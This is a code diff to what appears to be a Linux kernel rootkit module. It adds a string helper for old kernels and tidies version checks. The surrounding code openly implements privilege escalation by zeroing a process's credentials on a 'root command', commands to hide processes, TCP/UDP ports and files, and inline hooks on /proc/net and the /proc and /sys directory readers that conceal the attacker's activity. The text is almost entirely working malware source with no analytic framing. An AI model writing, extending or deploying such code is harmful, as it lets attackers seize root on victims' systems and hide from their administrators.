@@ -46,10 +46,29 @@
 
 #define TMPSZ 150
 
-/*
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0) && \
-    LINUX_VERSION_CODE < KERNEL_VERSION(4, 4, 0)
-*/
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
+
+char *strnstr(const char *haystack, const char *needle, size_t len)
+{
+        int i;
+        size_t needle_len;
+
+        if (0 == (needle_len = strnlen(needle, len)))
+                return (char *)haystack;
+
+        for (i=0; i<=(int)(len-needle_len); i++)
+        {
+                if ((haystack[0] == needle[0]) &&
+                        (0 == strncmp(haystack, needle, needle_len)))
+                        return (char *)haystack;
+
+                haystack++;
+        }
+        return NULL;
+}
+
+#endif
+
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)  && \
     LINUX_VERSION_CODE < KERNEL_VERSION(4, 16, 0)
 
@@ -930,16 +949,11 @@ int execute_command(const char __user *str, size_t length)
         pr_info("Got root command\n");
         struct cred *creds = prepare_creds();
 
-/*
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
-    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
-*/
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 5, 0)
         
         creds->uid = creds->euid = 0;
         creds->gid = creds->egid = 0;
         
-//#elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0)
 #elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0)
 
         creds->uid.val = creds->euid.val = 0;
@@ -958,7 +972,6 @@ int execute_command(const char __user *str, size_t length)
         pr_info("Got unhide pid command\n");
         str += sizeof(CFG_UNHIDE_PID);
         pid_remove(str);	    
-	    
     } else if (strcmp(str, CFG_HIDE_TCP_PORT) == 0) {
         pr_info("Got hide tcp port command\n");
         str += sizeof(CFG_HIDE_TCP_PORT);
@@ -966,8 +979,7 @@ int execute_command(const char __user *str, size_t length)
     } else if (strcmp(str, CFG_UNHIDE_TCP_PORT) == 0) {
         pr_info("Got unhide tcp port command\n");
         str += sizeof(CFG_UNHIDE_TCP_PORT);
-        unhide_tcp4_port(str);
-	    
+        unhide_tcp4_port(str);    
     } else if (strcmp(str, CFG_HIDE_TCP6_PORT) == 0) {
         pr_info("Got hide tcp6 port command\n");
         str += sizeof(CFG_HIDE_TCP6_PORT);
@@ -975,8 +987,7 @@ int execute_command(const char __user *str, size_t length)
     } else if (strcmp(str, CFG_UNHIDE_TCP6_PORT) == 0) {
         pr_info("Got unhide tcp6 port command\n");
         str += sizeof(CFG_UNHIDE_TCP6_PORT);
-        unhide_tcp6_port(str);	   
-	    
+        unhide_tcp6_port(str);	       
     } else if (strcmp(str, CFG_HIDE_UDP_PORT) == 0) {
         pr_info("Got hide udp port command\n");
         str += sizeof(CFG_HIDE_UDP_PORT);
@@ -984,8 +995,7 @@ int execute_command(const char __user *str, size_t length)
     } else if (strcmp(str, CFG_UNHIDE_UDP_PORT) == 0) {
         pr_info("Got unhide udp port command\n");
         str += sizeof(CFG_UNHIDE_UDP_PORT);
-        unhide_udp4_port(str);
-	    
+        unhide_udp4_port(str);	    
     } else if (strcmp(str, CFG_HIDE_UDP6_PORT) == 0) {
         pr_info("Got hide udp6 port command\n");
         str += sizeof(CFG_HIDE_UDP6_PORT);
@@ -993,8 +1003,7 @@ int execute_command(const char __user *str, size_t length)
     } else if (strcmp(str, CFG_UNHIDE_UDP6_PORT) == 0) {
         pr_info("Got unhide udp6 port command\n");
         str += sizeof(CFG_UNHIDE_UDP6_PORT);
-        unhide_udp6_port(str);	
-	    
+        unhide_udp6_port(str);	    
     } else if (strcmp(str, CFG_HIDE_FILE) == 0) {
         pr_info("Got hide file command\n");
         str += sizeof(CFG_HIDE_FILE);
@@ -1075,10 +1084,7 @@ int setup_proc_comm_channel(void)
 
     struct file_operations *proc_fops = NULL;
 
-/*
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 32) && \
-    LINUX_VERSION_CODE < KERNEL_VERSION(4, 4, 0)
-*/
+	
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 32) && \
     LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 
@@ -1096,10 +1102,7 @@ int setup_proc_comm_channel(void)
         proc_entry = proc_entry->next;
     }
 
-/*
-#elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
-    LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
-*/
+	
 #elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 19, 0) && \
     LINUX_VERSION_CODE < KERNEL_VERSION(4, 14, 0)	
 
@@ -1176,11 +1179,6 @@ int init(void)
 
     pr_info("Comm channel is set up\n");
 	
-	
- /* Hook /proc/net/tcp for hiding tcp4 connections */
-    //tcp4_seq_show = get_tcp_seq_show("/proc/net/tcp");
-    //hijack_start(tcp4_seq_show, &n_tcp4_seq_show);
-	
     asm_hook_create(get_tcp_seq_show("/proc/net/tcp"), n_tcp4_seq_show);
     asm_hook_create(get_tcp_seq_show("/proc/net/tcp6"), n_tcp6_seq_show);
     asm_hook_create(get_udp_seq_show("/proc/net/udp"), n_udp4_seq_show);
@@ -1194,10 +1192,6 @@ int init(void)
     asm_hook_create(get_fop("/proc")->readdir, proc_readdir);
     asm_hook_create(get_fop("/sys")->readdir, sys_readdir);
 
-/*
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
-    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
-*/
 #elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 3, 0) && \
       LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0) 
 
